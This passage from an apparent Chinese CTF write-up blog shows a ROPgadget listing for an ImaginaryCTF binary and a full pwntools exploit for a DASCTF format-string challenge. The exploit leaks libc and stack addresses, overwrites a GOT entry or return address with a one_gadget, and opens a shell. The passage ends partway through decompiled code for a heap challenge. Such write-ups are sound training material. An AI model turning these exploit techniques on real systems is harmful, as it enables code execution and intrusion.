<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401177</span> <span class="token number">0F</span> <span class="token number">05</span>                         syscall                                 <span class="token punctuation">;</span> LINUX <span class="token operator">-</span> sys_open
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401179</span> <span class="token number">48</span> <span class="token number">89</span> C6                      mov     rsi<span class="token punctuation">,</span> rax                        <span class="token punctuation">;</span> in_fd
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040117</span>C <span class="token number">48</span> C7 C7 <span class="token number">01</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>          mov     rdi<span class="token punctuation">,</span> <span class="token number">1</span>                          <span class="token punctuation">;</span> out_fd
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401183</span> <span class="token number">48</span> C7 C2 <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>          mov     rdx<span class="token punctuation">,</span> <span class="token number">0</span>                          <span class="token punctuation">;</span> offset
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040118</span>A <span class="token number">49</span> C7 C0 <span class="token number">00</span> <span class="token number">01</span> <span class="token number">00</span> <span class="token number">00</span>          mov     r8<span class="token punctuation">,</span> <span class="token number">100</span>h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401191</span> <span class="token number">48</span> C7 C0 <span class="token number">28</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>          mov     rax<span class="token punctuation">,</span> <span class="token number">28</span>h <span class="token punctuation">;</span> <span class="token char">'('</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401198</span> <span class="token number">0F</span> <span class="token number">05</span>                         syscall                                 <span class="token punctuation">;</span> LINUX <span class="token operator">-</span> sys_sendfile
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040119</span>A <span class="token number">90</span>                            nop
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040119</span>B <span class="token number">5</span>D                            pop     rbp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040119</span>C C3                            retn
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040119</span>C                               <span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// starts at 40115D</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040119</span>C
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040119</span>C                               printfile endp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040119</span>C<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>真的是很巧妙的构造，main函数中存在一个栈溢出，是fgets函数，然后有一个printfile函数，通过open 和 sendfile将一个文件的内容打印出来，printfile在使用前必须控制rdi寄存器才能printfile成功，由于高版本glibc csu函数变成了动态链接，所以以ret结尾能控制寄存器的gadget寥寥无几，能控制rdi寄存器为我想要的值的gadget基本上没有</p>
<pre class="line-numbers language-none"><code class="language-none">lhj@lhj-virtual-machine:~&#x2F;Desktop&#x2F;ImaginaryCTF&#x2F;pwn&#x2F;ropity$ ROPgadget --binary vuln
Gadgets information
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
0x00000000004010ab : add bh, bh ; loopne 0x401115 ; nop ; ret
0x000000000040116f : add byte ptr [rax - 0x39], cl ; mov byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401182 : add byte ptr [rax - 0x39], cl ; ret 0
0x0000000000401190 : add byte ptr [rax - 0x39], cl ; shr byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401180 : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0
0x000000000040107c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401173 : add byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040111a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040107e : add byte ptr [rax], al ; endbr64 ; ret
0x000000000040118f : add byte ptr [rax], al ; mov rax, 0x28 ; syscall
0x000000000040116e : add byte ptr [rax], al ; mov rsi, 0 ; syscall
0x0000000000401175 : add byte ptr [rax], al ; syscall
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040111b : add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004010aa : add dil, dil ; loopne 0x401115 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401117 : add eax, 0x2f1b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401159 : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401133 : cli ; jmp 0x4010c0
0x0000000000401083 : cli ; ret
0x00000000004011a3 : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401130 : endbr64 ; jmp 0x4010c0
0x0000000000401080 : endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x00000000004010a5 : je 0x4010b0 ; mov edi, 0x404030 ; jmp rax
0x00000000004010e7 : je 0x4010f0 ; mov edi, 0x404030 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401134 : jmp 0x4010c0
0x000000000040100b : jmp 0x4840103f
0x00000000004010ac : jmp rax
0x000000000040115b : leave ; ret
0x00000000004010ad : loopne 0x401115 ; nop ; ret
0x0000000000401172 : mov byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401116 : mov byte ptr [rip + 0x2f1b], 1 ; pop rbp ; ret
0x0000000000401192 : mov eax, 0x28 ; syscall
0x00000000004010a7 : mov edi, 0x404030 ; jmp rax
0x0000000000401171 : mov esi, 0 ; syscall
0x0000000000401191 : mov rax, 0x28 ; syscall
0x0000000000401170 : mov rsi, 0 ; syscall
0x000000000040115a : nop ; leave ; ret
0x000000000040119a : nop ; pop rbp ; ret
0x00000000004010af : nop ; ret
0x000000000040112c : nop dword ptr [rax] ; endbr64 ; jmp 0x4010c0
0x00000000004010a6 : or dword ptr [rdi + 0x404030], edi ; jmp rax
0x000000000040111d : pop rbp ; ret
0x000000000040101a : ret
0x0000000000401185 : ret 0
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000401118 : sbb ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401193 : shr byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401194 : sub byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x00000000004011a5 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004011a4 : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401177 : syscall
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x00000000004010a3 : test eax, eax ; je 0x4010b0 ; mov edi, 0x404030 ; jmp rax
0x00000000004010e5 : test eax, eax ; je 0x4010f0 ; mov edi, 0x404030 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
0x00000000004010a8 : xor byte ptr [rax + 0x40], al ; add bh, bh ; loopne 0x401115 ; nop ; ret

Unique gadgets found: 65
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2024/08/01/ImaginaryCTF/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/07/22/dasctf2024-summer-challenge/" >dasctf2024_summer_challenge</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-07-22  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/dasctf2024_summer_challenge">https://github.com/nyyyddddn/ctf/tree/main/dasctf2024_summer_challenge</a></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="spring-board"><a href="#spring-board" class="headerlink" title="spring_board"></a>spring_board</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>

  <span class="token function">myinit</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Life is not boring, dreams are not out of reach."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Sometimes you just need a springboard."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Then you can see a wider world."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"There may be setbacks along the way."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"But keep your love of life alive."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I believe that you will succeed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good luck."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Here's a simple pwn question, challenge yourself."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You have an 5 chances to get a flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This is the %d time\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please enter a keyword"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> bss<span class="token punctuation">,</span> <span class="token number">0x40uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>非栈上格式化字符串，需要找一个指向栈的双重指针去写地址，然后调整双重指针实现任意地址写，got表可以写，这个情况有点麻烦，除非一次写四个字节？远程试了几次发现能写成功？？ 也可以写main的返回地址为onegadget吧，这样就不用一次写这么多字节了</p>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">0</span>
IP <span class="token operator">=</span> <span class="token string">"node5.buuoj.cn"</span>
PORT <span class="token operator">=</span> <span class="token number">28552</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># _libc_stack</span>
payload <span class="token operator">=</span> <span class="token string">"-%9$p-%11$p"</span>

<span class="token comment"># ru("Please enter a keyword")</span>
s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ba6ad020840</span> <span class="token operator">-</span> <span class="token number">0x7ba6ad000000</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>

success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>

target_i <span class="token operator">=</span> stack <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ffd3b5bd3a8</span> <span class="token operator">-</span> <span class="token number">0x7ffd3b5bd2bc</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>target_i<span class="token punctuation">)</span><span class="token punctuation">)</span>

one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf1247</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
puts_got <span class="token operator">=</span> <span class="token number">0x601020</span>
printf_got <span class="token operator">=</span> <span class="token number">0x0000000000601028</span>

success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"one_gadget -></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>


<span class="token comment"># pwndbg> fmtarg 0x7ffec2942308</span>
<span class="token comment"># The index of format argument : 12 ("\%11$p")</span>
<span class="token comment"># pwndbg> fmtarg 0x7ffec29423d8</span>
<span class="token comment"># The index of format argument : 38 ("\%37$p")</span>

payload <span class="token operator">=</span> <span class="token string">b"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>printf_got <span class="token operator">&amp;</span> <span class="token number">0xffffff</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"c%11$lln\x00"</span>
<span class="token comment"># g(p)</span>
s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># g(p)</span>
payload <span class="token operator">=</span> <span class="token string">b"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>one_gadget <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"c%37$n\x00"</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>

s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>


<span class="token comment"># g(p)</span>
s<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>


p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="magicbook"><a href="#magicbook" class="headerlink" title="magicbook"></a>magicbook</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h] BYREF</span>

  <span class="token function">init</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">menu1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  dest <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    book <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>book<span class="token punctuation">;</span>
    <span class="token function">menu2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
LABEL_12<span class="token operator">:</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">switch</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
          <span class="token function">edit_the_book</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
          <span class="token function">creat_the_book</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
          <span class="token function">delete_the_book</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token operator">:</span>
          <span class="token keyword">goto</span> LABEL_12<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">edit_the_book</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">size_t</span> v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"come on,Write down your story!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> book<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v0 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">size_t</span> <span class="token function">creat_the_book</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">size_t</span> v0<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
  __int64 size<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-14h] BYREF</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> book <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"full!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the book index is %d\n"</span><span class="token punctuation">,</span> book<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How many pages does your book need?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">LODWORD</span><span class="token punctuation">(</span>size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
